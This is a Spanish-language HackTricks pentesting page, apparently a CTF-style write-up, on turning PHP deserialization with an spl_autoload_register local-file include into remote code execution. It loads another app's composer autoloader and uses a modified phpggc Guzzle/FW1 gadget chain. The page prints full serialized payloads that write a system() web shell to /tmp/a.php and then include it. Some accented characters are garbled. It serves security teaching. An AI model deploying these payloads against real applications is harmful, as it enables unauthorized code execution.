# PHP - Deserializaci칩n + Clases de Autoload

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

Primero, debes verificar qu칠 son [**Clases de Autoloading**](https://www.php.net/manual/en/language.oop5.autoload.php).

## Deserializaci칩n de PHP + spl\_autoload\_register + LFI/Gadget

Estamos en una situaci칩n donde encontramos una **deserializaci칩n de PHP en una webapp** sin **ninguna** biblioteca vulnerable a gadgets dentro de **`phpggc`**. Sin embargo, en el mismo contenedor hab칤a una **webapp de composer diferente con bibliotecas vulnerables**. Por lo tanto, el objetivo era **cargar el cargador de composer de la otra webapp** y abusar de 칠l para **cargar un gadget que explotar치 esa biblioteca con un gadget** de la webapp vulnerable a deserializaci칩n.

Pasos:

* Has encontrado una **deserializaci칩n** y **no hay ning칰n gadget** en el c칩digo de la aplicaci칩n actual.
* Puedes abusar de una funci칩n **`spl_autoload_register`** como la siguiente para **cargar cualquier archivo local con extensi칩n `.php`**.
* Para eso, usas una deserializaci칩n donde el nombre de la clase va a estar dentro de **`$name`**. **No puedes usar "/" o "."** en un nombre de clase en un objeto serializado, pero el **c칩digo** est치 **reemplazando** los **guiones bajos** ("\_") **por barras** ("/"). As칤 que un nombre de clase como `tmp_passwd` ser치 transformado en `/tmp/passwd.php` y el c칩digo intentar치 cargarlo.\
Un **ejemplo de gadget** ser치: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Si tienes una **carga de archivos** y puedes subir un archivo con **extensi칩n `.php`**, podr칤as **abusar de esta funcionalidad directamente** y obtener RCE ya.
{% endhint %}

En mi caso, no ten칤a nada como eso, pero hab칤a dentro del **mismo contenedor** otra p치gina web de composer con una **biblioteca vulnerable a un gadget `phpggc`**.

* Para cargar esta otra biblioteca, primero necesitas **cargar el cargador de composer de esa otra aplicaci칩n web** (porque el de la aplicaci칩n actual no acceder치 a las bibliotecas de la otra). **Conociendo la ruta de la aplicaci칩n**, puedes lograr esto muy f치cilmente con: **`O:28:"www_frontend_vendor_autoload":0:{}`** (En mi caso, el cargador de composer estaba en `/www/frontend/vendor/autoload.php`)
* Ahora, puedes **cargar** el **cargador de composer de la otra app**, as칤 que es hora de **`generar la carga 칰til de phpgcc`** para usar. En mi caso, utilic칠 **`Guzzle/FW1`**, que me permiti칩 **escribir cualquier archivo dentro del sistema de archivos**.
* NOTA: La **carga 칰til generada no funcionaba**, para que funcionara **modifiqu칠** esa carga 칰til **`chain.php`** de phpggc y establec칤 **todos los atributos** de las clases **de privado a p칰blico**. Si no, despu칠s de deserializar la cadena, los atributos de los objetos creados no ten칤an ning칰n valor.
* Ahora tenemos la forma de **cargar el cargador de composer de la otra app** y tener una **carga 칰til de phpggc que funciona**, pero necesitamos **hacer esto en la MISMA SOLICITUD para que el cargador se cargue cuando se use el gadget**. Para eso, envi칠 un array serializado con ambos objetos como:
* Puedes ver **primero el cargador siendo cargado y luego la carga 칰til**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Ahora, podemos **crear y escribir un archivo**, sin embargo, el usuario **no pudo escribir en ninguna carpeta dentro del servidor web**. As칤 que, como puedes ver en la carga 칰til, PHP llama a **`system`** con alg칰n **base64** que se crea en **`/tmp/a.php`**. Luego, podemos **reutilizar el primer tipo de carga 칰til** que usamos como LFI para cargar el cargador de composer de la otra aplicaci칩n web **para cargar el archivo generado `/tmp/a.php`**. Simplemente agr칠galo al gadget de deserializaci칩n:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**Resumen de la carga 칰til**

* **Cargar el autoload de composer** de una aplicaci칩n web diferente en el mismo contenedor
* **Cargar un gadget phpggc** para abusar de una biblioteca de la otra aplicaci칩n web (la aplicaci칩n web inicial vulnerable a la deserializaci칩n no ten칤a ning칰n gadget en sus bibliotecas)
* El gadget **crear치 un archivo con una carga 칰til PHP** en /tmp/a.php con comandos maliciosos (el usuario de la aplicaci칩n web no puede escribir en ninguna carpeta de ninguna aplicaci칩n web)
* La parte final de nuestra carga 칰til usar치 **cargar el archivo PHP generado** que ejecutar치 comandos

Necesit칠 **llamar a esta deserializaci칩n dos veces**. En mis pruebas, la primera vez se cre칩 el archivo `/tmp/a.php` pero no se carg칩, y la segunda vez se carg칩 correctamente.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
